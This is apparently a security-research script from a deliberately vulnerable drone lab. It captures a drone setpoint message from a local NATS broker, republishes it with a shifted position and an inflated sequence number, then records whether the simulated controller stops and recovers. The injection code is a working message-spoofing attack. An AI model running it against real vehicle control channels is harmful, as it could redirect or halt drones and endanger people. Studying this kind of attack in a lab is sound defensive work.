#!/usr/bin/env python3
"""Bounded high-water setpoint mutation and same-run recovery observation."""

from __future__ import annotations

import json
import subprocess
import time
from pathlib import Path

from antoine_setpoint_mutation import (
    CONTROLLER_LOG,
    last_motor_sequence,
    read_audit_rows,
    read_one_json,
    validate_server,
    wait_for_controller_ready,
    wait_for_mutation_effect,
)
from dvd_research.run_files import read_run_text, write_run_json


def publish(server: str, subject: str, message: dict) -> None:
    subprocess.run(
        [
            "nats",
            "--no-context",
            "--server",
            server,
            "pub",
            subject,
            json.dumps(message, separators=(",", ":")),
        ],
        check=True,
        capture_output=True,
        text=True,
        timeout=8,
    )


def main() -> int:
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--run-dir", required=True, type=Path)
    args = parser.parse_args()
    run_dir = args.run_dir
    run_id = run_dir.name
    subject = "furia.gzsitl.setpoint.drone-1"
    result = {
        "contract": "damn-vulnerable-drone.sequence-poisoning-observation",
        "version": "1.0.0",
        "scenario": "setpoint-sequence-poisoning-antoine",
        "runId": run_id,
        "server": args.server,
        "targetSubject": subject,
        "publishedMessages": 2,
        "scope": "one run-owned loopback NATS broker and one local Gazebo X500",
        "highWaterSequence": None,
        "recoverySequence": None,
        "highWaterAccepted": False,
        "grantMismatchStopObserved": False,
        "recoveryParserAccepted": False,
        "actuatorProgressAfterRecovery": False,
        "recoveryToActuatorProgressMs": None,
        "runIdentityMatches": False,
        "qualification": "inconclusive",
    }
    try:
        deadline = time.monotonic() + 100
        validate_server(args.server, run_dir, deadline)
        wait_for_controller_ready(run_dir, deadline)
        captured = subprocess.run(
            ["nats", "--no-context", "--server", args.server, "sub", "--count=1", "--raw", subject],
            check=True,
            capture_output=True,
            text=True,
            timeout=12,
        )
        message = read_one_json(captured.stdout)
        required = {
            "contract": "furia.gzsitl.mission-setpoint",
            "version": "2.1.0",
            "vehicleId": "drone-1",
            "missionId": "antoine-local-authority-drone-1",
            "graphId": "antoine-local-authority-graph-drone-1",
            "taskId": "antoine-local-authority-waypoint-drone-1",
        }
        if any(message.get(key) != value for key, value in required.items()):
            raise ValueError("captured setpoint does not match the local mission fixture")
        original_position = message.get("position_enu_m")
        if not isinstance(original_position, list) or len(original_position) != 3:
            raise ValueError("captured setpoint has no three-axis position")
        original_position = [float(value) for value in original_position]
        prior_sequence = int(message.get("sequence", 0))
        high_water = max(prior_sequence + 1, 1_000_000)
        now_ms = int(time.time() * 1000)
        poisoned = dict(message)
        poisoned["position_enu_m"] = [
            original_position[0] + 2.0,
            original_position[1],
            original_position[2],
        ]
        poisoned["sequence"] = high_water
        poisoned["issuedAtMs"] = now_ms
        poisoned["expiresAtMs"] = now_ms + 1_500
        high_water_publish_ms = int(time.time() * 1000)
        prior_rows = len(read_audit_rows(run_dir))
        publish(args.server, subject, poisoned)
        accepted, stop, accepted_at = wait_for_mutation_effect(
            run_dir,
            high_water,
            run_id,
            prior_rows,
            time.monotonic() + 8,
        )
        if not accepted or stop is None:
            raise TimeoutError(
                "high-water message acceptance or same-run neutral stop was not observed"
            )

        stop_motor_sequence = last_motor_sequence(run_dir)
        stop_matches = stop.get("stage") == "explicit-stop" and stop.get("runId") == run_id
        recovery_sequence = high_water + 1
        recovery = dict(message)
        recovery["position_enu_m"] = original_position
        recovery["sequence"] = recovery_sequence
        recovery_publish_ms = int(time.time() * 1000)
        recovery["issuedAtMs"] = recovery_publish_ms
        recovery["expiresAtMs"] = recovery_publish_ms + 1_500
        publish(args.server, subject, recovery)
        marker = f"ANTOINE_GZ_SETPOINT_RECEIVED callsign=drone-1 sequence={recovery_sequence} accepted_at_unix_ms="
        accepted_recovery_at = None
        progress_at = None
        recovery_deadline = time.monotonic() + 5
        while time.monotonic() < recovery_deadline:
            try:
                log_text = read_run_text(run_dir, CONTROLLER_LOG, errors="replace") or ""
                for line in log_text.splitlines():
                    if marker in line:
                        value = line.partition(marker)[2].strip()
                        if value.isdigit():
                            accepted_recovery_at = int(value)
                            break
            except OSError:
                pass
            current_motor_sequence = last_motor_sequence(run_dir)
            if current_motor_sequence > stop_motor_sequence:
                progress_at = int(time.time() * 1000)
                break
            time.sleep(0.05)

        result.update(
            {
                "capturedSequence": prior_sequence,
                "highWaterSequence": high_water,
                "highWaterPublishAtUnixMs": high_water_publish_ms,
                "originalPositionEnuM": original_position,
                "mutatedPositionEnuM": poisoned["position_enu_m"],
                "highWaterAccepted": accepted,
                "highWaterAcceptedAtUnixMs": accepted_at,
                "grantMismatchStopObserved": stop_matches,
                "neutralStop": stop,
                "motorSequenceAtStop": stop_motor_sequence,
                "recoverySequence": recovery_sequence,
                "recoveryPositionEnuM": original_position,
                "recoveryPublishAtUnixMs": recovery_publish_ms,
                "recoveryParserAccepted": accepted_recovery_at is not None,
                "recoveryAcceptedAtUnixMs": accepted_recovery_at,
                "motorSequenceAfterRecovery": last_motor_sequence(run_dir),
                "actuatorProgressAfterRecovery": progress_at is not None,
                "recoveryToActuatorProgressMs": progress_at - recovery_publish_ms
                if progress_at
                else None,
                "actuatorProgressAtUnixMs": progress_at,
                "runIdentityMatches": stop_matches,
                "qualification": (
                    "bounded_sequence_recovery_observed"
                    if accepted
                    and stop_matches
                    and accepted_recovery_at is not None
                    and progress_at
                    else "inconclusive"
                ),
                "limitations": [
                    "The controller process was not restarted; restart persistence is inferred from source scope, not measured.",
                    "Parser acceptance and motor-sequence progress do not establish waypoint completion or physical safety.",
                ],
            }
        )
    except Exception as error:
        result["error"] = f"{type(error).__name__}: {error}"
    write_run_json(run_dir, Path("research-sequence-poisoning.json"), result)
    print(json.dumps(result, indent=2))
    return 0 if result["qualification"] == "bounded_sequence_recovery_observed" else 2


if __name__ == "__main__":
    raise SystemExit(main())
